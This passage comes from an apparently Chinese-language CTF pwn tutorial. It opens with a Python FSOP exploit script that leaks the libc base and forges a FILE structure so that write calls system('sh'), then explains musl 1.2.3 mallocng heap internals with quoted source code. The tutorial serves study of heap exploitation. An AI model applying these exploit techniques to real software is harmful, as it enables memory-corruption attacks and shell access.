f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>():</span><br><span class="line">    heap_arr = <span class="number">0x4120A0</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0xa0</span>)  <span class="comment"># chunk0</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0xa0</span>)  <span class="comment"># chunk1</span></span><br><span class="line">    libc.address = u32(show(<span class="number">0</span>, <span class="number">0x4</span>)) - <span class="number">0xdd008</span></span><br><span class="line">    heap_addr = libc.address + <span class="number">0xded50</span></span><br><span class="line">    stdin_used = libc.symbols[<span class="string">&#x27;__stdin_used&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;stdin_used: <span class="subst">&#123;<span class="built_in">hex</span>(stdin_used)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0xac</span>, flat([<span class="string">b&#x27;\x00\x00\x00\x01&#x27;</span>, p32(<span class="number">0xa8</span>), </span><br><span class="line">                        heap_arr+<span class="number">0x4</span>*<span class="number">0x4</span>, heap_arr+<span class="number">0x4</span>*<span class="number">0x4</span>, </span><br><span class="line">                        <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x98</span>, <span class="string">b&#x27;\x00\x00\x00\xa8&#x27;</span>]))</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">0x4</span>, p32(stdin_used))</span><br><span class="line">    edit(<span class="number">4</span>, <span class="number">0x4</span>, p32(heap_addr))</span><br><span class="line"></span><br><span class="line">    fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    fake_file += <span class="string">b&quot;sh&quot;</span>.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">    fake_file += p32(<span class="number">0x114</span>)  <span class="comment"># wpos</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">    fake_file += p32(<span class="number">0x514</span>)  <span class="comment"># wbase</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">    fake_file += p32(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0xa0</span>, flat([fake_file]))</span><br><span class="line">    cmd(<span class="string">&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h1 id="Musl-heap-musl-1-2-3"><a href="#Musl-heap-musl-1-2-3" class="headerlink" title="Musl heap (musl-1.2.3)"></a>Musl heap (musl-1.2.3)</h1><p>源码：<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/musl/v1.2.3/source/src/malloc/mallocng/meta.h#L24" >https://elixir.bootlin.com/musl/v1.2.3/source/src/malloc/mallocng/meta.h#L24<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>本文例题以mips64架构为例：<a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/MAPwn/tree/master/mips64" >https://github.com/jelasin/MAPwn/tree/master/mips64<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/d79edcc2ff4572a91c7429c108bd89e1.png"
                     
                ></p>
<h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><p>musl 内存管理时经常使用双向链表来缓存一些 <code>meta</code> 的结构，我们暂且称它为 deque 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/9d32bd917c91d670b1af725390e1c48c.png"
                     
                ></p>
<p>对应的操作有 <code>queue</code>，<code>dequeue</code>，<code>dequeue_head</code> 三个操作。</p>
<h4 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h4><p><code>queue</code> 函数的作用是将 <code>*m</code> 插入到 <code>*phead</code> 指向的 deque 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    assert(!m-&gt;next);</span><br><span class="line">    assert(!m-&gt;prev);</span><br><span class="line">    <span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">        m-&gt;next = head;</span><br><span class="line">        m-&gt;prev = head-&gt;prev;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        m-&gt;prev = m-&gt;next = m;</span><br><span class="line">        *phead = m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h4><p><code>dequeue</code> 函数的作用是将 <code>*m</code> 从 <code>*phead</code> 指向的 deque 中取出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="dequeue-head"><a href="#dequeue-head" class="headerlink" title="dequeue_head"></a>dequeue_head</h4><p><code>dequeue_head</code> 函数的作用是将 <code>*phead</code> 指向的 <code>meta</code> 结构从 <code>*phead</code> 指向的 deque 中取出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">dequeue_head</span><span class="params">(<span class="keyword">struct</span> meta **phead)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *phead;</span><br><span class="line">    <span class="keyword">if</span> (m) dequeue(phead, m);</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="malloc_context"></a>malloc_context</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这个结构体是musl libc的堆管理最上层结构，其中字段的含义分别为：</p>
<ul>
<li><p><code>uint64_t secret</code>：一个随机生成的数，用于检查meta的合法性，也即一个 check guard 。</p>
</li>
<li><p><code>int init_done</code>：判断 <code>malloc_context</code> 是否初始化完成，在 <code>alloc_meta</code> 函数中进行检查，如果没有则进行初始化，否则跳过初始化流程，这里的初始化指的是初始化 <code>secret</code> 。</p>
</li>
<li><p><code>unsigned mmap_counter</code>：mmap 计数器，通过 mmap 分配了多少次空间用于内存分配。</p>
</li>
<li><p><code>struct meta *free_meta_head</code>：被释放的 <code>meta</code> 结构体构成的双向链表表头，<code>meta</code> 结构体是 musl libc 内存分配的低一级结构。</p>
</li>
<li><p><code>struct meta *avail_meta</code>：指向空闲的 meta 。</p>
</li>
<li><p><code>size_t avail_meta_count</code>：musl 保留但未使用的 <code>meta</code> 的数量。</p>
</li>
<li><p><code>avail_meta_area_count</code>：musl 保留但未使用的 <code>meta_area</code> 的数量。</p>
</li>
<li><p><code>meta_alloc_shift</code>：当没有空闲 <code>meta_area</code> 且 brk 不能为 <code>meta_arena</code> 申请连续内存时需要采用 mmap 的方式申请 <code>meta_arena</code>，<code>meta_alloc_shift</code> 用于计算了此时需要扩展的内存大小，这个值是动态调节的。</p>
</li>
<li><p><code>struct meta_area *meta_area_head, *meta_area_tail</code>：存放 <code>meta_area</code> 的单向链表，只作记录，没什么实际作用。</p>
</li>
<li><p><code>unsigned char *avail_meta_areas</code>：musl 保留但未使用的 <code>meta_area</code> 的起始地址，具体见后面对 <code>alloc_meta</code> 函数的分析。</p>
</li>
<li><p><code>struct meta *active[48]</code>：可以直接参与内存分配的 <code>meta</code>，按照 <code>meta</code> 管理的内存中 <code>chunk</code> 的大小划分为 48 组，每个组由 <code>meta</code> 形成一个 deque 。<br>48 个组中 <code>chunk</code> 大小以及 <code>malloc</code> 的 size 大小对应关系如下：</p>
<table>
<thead>
<tr>
<th>sc</th>
<th>chunk size</th>
<th>min size</th>
<th>max size</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x10</td>
<td>0x0</td>
<td>0xc</td>
</tr>
<tr>
<td>1</td>
<td>0x20</td>
<td>0xd</td>
<td>0x1c</td>
</tr>
<tr>
<td>2</td>
<td>0x30</td>
<td>0x1d</td>
<td>0x2c</td>
</tr>
<tr>
<td>3</td>
<td>0x40</td>
<td>0x2d</td>
<td>0x3c</td>
</tr>
<tr>
<td>4</td>
<td>0x50</td>
<td>0x3d</td>
<td>0x4c</td>
</tr>
<tr>
<td>5</td>
<td>0x60</td>
<td>0x4d</td>
<td>0x5c</td>
</tr>
<tr>
<td>6</td>
<td>0x70</td>
<td>0x5d</td>
<td>0x6c</td>
</tr>
<tr>
<td>7</td>
<td>0x80</td>
<td>0x6d</td>
<td>0x7c</td>
</tr>
<tr>
<td>8</td>
<td>0x90</td>
<td>0x7d</td>
<td>0x8c</td>
</tr>
<tr>
<td>9</td>
<td>0xa0</td>
<td>0x8d</td>
<td>0x9c</td>
</tr>
<tr>
<td>10</td>
<td>0xc0</td>
<td>0x9d</td>
<td>0xbc</td>
</tr>
<tr>
<td>11</td>
<td>0xf0</td>
<td>0xbd</td>
<td>0xec</td>
</tr>
<tr>
<td>12</td>
<td>0x120</td>
<td>0xed</td>
<td>0x11c</td>
</tr>
<tr>
<td>13</td>
<td>0x140</td>
<td>0x11d</td>
<td>0x13c</td>
</tr>
<tr>
<td>14</td>
<td>0x190</td>
<td>0x13d</td>
<td>0x18c</td>
</tr>
<tr>
<td>15</td>
<td>0x1f0</td>
<td>0x18d</td>
<td>0x1ec</td>
</tr>
<tr>
<td>16</td>
<td>0x240</td>
<td>0x1ed</td>
<td>0x23c</td>
</tr>
<tr>
<td>17</td>
<td>0x2a0</td>
<td>0x23d</td>
<td>0x29c</td>
</tr>
<tr>
<td>18</td>
<td>0x320</td>
<td>0x29d</td>
<td>0x31c</td>
</tr>
<tr>
<td>19</td>
<td>0x3f0</td>
<td>0x31d</td>
<td>0x3ec</td>
</tr>
<tr>
<td>20</td>
<td>0x480</td>
<td>0x3ed</td>
<td>0x47c</td>
</tr>
<tr>
<td>21</td>
<td>0x540</td>
<td>0x47d</td>
<td>0x53c</td>
</tr>
<tr>
<td>22</td>
<td>0x660</td>
<td>0x53d</td>
<td>0x65c</td>
</tr>
<tr>
<td>23</td>
<td>0x7f0</td>
<td>0x65d</td>
<td>0x7ec</td>
</tr>
<tr>
<td>24</td>
<td>0x920</td>
<td>0x7ed</td>
<td>0x91c</td>
</tr>
<tr>
<td>25</td>
<td>0xaa0</td>
<td>0x91d</td>
<td>0xa9c</td>
</tr>
<tr>
<td>26</td>
<td>0xcc0</td>
<td>0xa9d</td>
<td>0xcbc</td>
</tr>
<tr>
<td>27</td>
<td>0xff0</td>
<td>0xcbd</td>
<td>0xfec</td>
</tr>
<tr>
<td>28</td>
<td>0x1240</td>
<td>0xfed</td>
<td>0x123c</td>
</tr>
<tr>
<td>29</td>
<td>0x1540</td>
<td>0x123d</td>
<td>0x153c</td>
</tr>
<tr>
<td>30</td>
<td>0x1990</td>
<td>0x153d</td>
<td>0x198c</td>
</tr>
<tr>
<td>31</td>
<td>0x1ff0</td>
<td>0x198d</td>
<td>0x1fec</td>
</tr>
<tr>
<td>32</td>
<td>0x2480</td>
<td>0x1fed</td>
<td>0x247c</td>
</tr>
<tr>
<td>33</td>
<td>0x2aa0</td>
<td>0x247d</td>
<td>0x2a9c</td>
</tr>
<tr>
<td>34</td>
<td>0x3320</td>
<td>0x2a9d</td>
<td>0x331c</td>
</tr>
<tr>
<td>35</td>
<td>0x3ff0</td>
<td>0x331d</td>
<td>0x3fec</td>
</tr>
<tr>
<td>36</td>
<td>0x4910</td>
<td>0x3fed</td>
<td>0x490c</td>
</tr>
<tr>
<td>37</td>
<td>0x5540</td>
<td>0x490d</td>
<td>0x553c</td>
</tr>
<tr>
<td>38</td>
<td>0x6650</td>
<td>0x553d</td>
<td>0x664c</td>
</tr>
<tr>
<td>39</td>
<td>0x7ff0</td>
<td>0x664d</td>
<td>0x7fec</td>
</tr>
<tr>
<td>40</td>
<td>0x9240</td>
<td>0x7fed</td>
<td>0x923c</td>
</tr>
<tr>
<td>41</td>
<td>0xaaa0</td>
<td>0x923d</td>
<td>0xaa9c</td>
</tr>
<tr>
<td>42</td>
<td>0xccc0</td>
<td>0xaa9d</td>
<td>0xccbc</td>
</tr>
<tr>
<td>43</td>
<td>0xfff0</td>
<td>0xccbd</td>
<td>0xffec</td>
</tr>
<tr>
<td>44</td>
<td>0x12480</td>
<td>0xffed</td>
<td>0x1247c</td>
</tr>
<tr>
<td>45</td>
<td>0x15540</td>
<td>0x1247d</td>
<td>0x1553c</td>
</tr>
<tr>
<td>46</td>
<td>0x19980</td>
<td>0x1553d</td>
<td>0x1997c</td>
</tr>
<tr>
<td>47</td>
<td>0x1fff0</td>
<td>0x1997d</td>
<td>0x1ffec</td>
</tr>
</tbody></table>
</li>
<li><p><code>size_t usage_by_class[48]</code>：对应大小的缓存的所有 <code>meta</code> 的 <code>group</code> 所管理的 chunk 个数。</p>
</li>
<li><p><code>uint8_t unmap_seq[32], bounces[32]</code>：参与 <code>alloc_group</code> 中计算新分配 group 的大小。</p>
</li>
<li><p><code>uint8_t seq</code>：参与 <code>alloc_group</code> 中计算新分配 group 的大小。</p>
</li>
<li><p><code>uintptr_t brk</code>：记录目前的 <code>brk(0)</code> ，如果 brk 不能分配连续内存则该值设为 -1 。</p>
</li>
</ul>
<p><code>malloc_context</code> 被实例化为全局变量 <code>ctx</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ctx __malloc_context</span></span><br><span class="line"></span><br><span class="line">__attribute__((__visibility__(<span class="string">&quot;hidden&quot;</span>))) <span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> <span class="title">ctx</span>;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这个结构用于管理一页内的所有 <code>meta</code> 结构，属于 <code>malloc_context</code> 的下级结构，<code>meta</code> 的上级结构。</p>
<ul>
<li><code>uint64_t check</code>：检查字段，与 <code>malloc_context</code> 中的 <code>secret</code> 字段对应，检查该 <code>meta_area</code> 是否可能被修改</li>
<li><code>struct meta_area *next</code>：下一个<code>meta_area</code>的地址，与前面 <code>malloc_context</code> 的 <code>struct meta_area *meta_area_head, *meta_area_tail</code> 一起构成单向链表，存放空闲的 <code>meta_area</code> ，正常使用中的 <code>meta_area</code> 该字段为 0 。</li>
<li><code>int nslots</code>：该 <code>meta_area</code> 中管理的 <code>meta</code> 数量，一般为固定值。</li>
<li><code>struct meta slots[]</code>：管理的 <code>meta</code> 数组</li>
</ul>
<h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx : <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable : <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass : <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen : <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>meta</code> 中保存有 <code>group</code> 结构体指针，后者直接保存有需要分配的内存块。</p>
<ul>
<li><code>struct meta *prev, *next</code>：构成双向链表，即前面的 deque 。</li>
<li><code>struct group *mem</code>：<code>meta</code> 管理的 <code>group</code> 结构体指针</li>
<li><code>volatile int avail_mask, freed_mask</code>：表示 <code>meta</code> 管理的 <code>group</code> 结构体中每个 chunk 的状态，即是否可被分配和是否已被释放（实际可能没有经过释放的 chunk 也可能 对应 <code>freed_mask</code> 置位，因此叫做未激活更合适）。在 musl heap 中，chunk 有 可分配，释放和在使用三个状态，且每个 chunk 只能处在三个状态中的一种上。并且释放的 chunk 不能立即参与分配，只有参与分配的 chunk 不够时才会通过 <code>try_avail</code> 将处于释放状态的 chunk 转换为处于可分配状态。</li>
<li><code>uintptr_t last_idx:5</code>：该 <code>meta</code> 中最后一个 chunk 的索引，也就是该 <code>meta</code> 管理 <code>last_idx + 1</code> 个 chunk 。</li>
<li><code>freeable:1</code>：该 <code>meta</code> 中的 <code>chunk</code> 是否能够被释放，这个值一般都是 1 。</li>
<li><code>uintptr_t sizeclass:6</code>：管理的 <code>group</code> 的 chunk 大小属于哪一组。是 mmap 分配，则固定为 63 。</li>
<li><code>uintptr_t maplen:8*sizeof(uintptr_t)-12</code>：如果管理的 <code>group</code> 是 mmap分配的，则为内存页数，否则为 0 。</li>
</ul>
<p>以位于 heap 段的 <code>meta_area</code> 为例，内存分布如下图所示，因此 <code>meta</code> 可以通过找所在内存页基址查找到对应的 <code>meta_area</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/09142b51a139b08e083963a07bf67f44.png"
                     
                ></p>
<p>与 <code>meta</code> 相关的函数这里先介绍 <code>free_meta</code> 和 <code>alloc_meta</code> 。</p>
<h4 id="get-stride"><a href="#get-stride" class="headerlink" title="get_stride"></a>get_stride</h4><p>根据 <code>meta</code> 获取其管理的 <code>group</code> 中 chunk 的大小。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_stride</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;last_idx &amp;&amp; g-&gt;maplen) &#123;</span><br><span class="line">        <span class="keyword">return</span> g-&gt;maplen * <span class="number">4096UL</span> - UNIT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UNIT * size_classes[g-&gt;sizeclass];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="free-meta"><a href="#free-meta" class="headerlink" title="free_meta"></a>free_meta</h4><p>释放 <code>meta</code> 实际上就是将 <code>meta</code> 清零后放入 <code>free_meta_head</code> 指向的 deque 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">free_meta</span><span class="params">(<span class="keyword">struct</span> meta *m)</span> &#123;</span><br><span class="line">    *m = (<span class="keyword">struct</span> meta)&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.free_meta_head, m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="alloc-meta"><a href="#alloc-meta" class="headerlink" title="alloc_meta"></a>alloc_meta</h4><p>首先判断 <code>ctx</code> 是否初始化，没有初始化则初始化 <code>secret</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!ctx.init_done) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">        ctx.pagesize = get_page_size();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        ctx.secret = get_random_secret();</span><br><span class="line">        ctx.init_done = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>之后初始化 <code>pagesize</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PAGESIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSZ PAGESIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGSZ ctx.pagesize</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = PGSZ;</span><br><span class="line">    <span class="keyword">if</span> (pagesize &lt; <span class="number">4096</span>) pagesize = <span class="number">4096</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>free_meta_head</code> 不为空则从中取出之前释放的 <code>meta</code> 并返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((m = dequeue_head(&amp;ctx.free_meta_head))) <span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div>

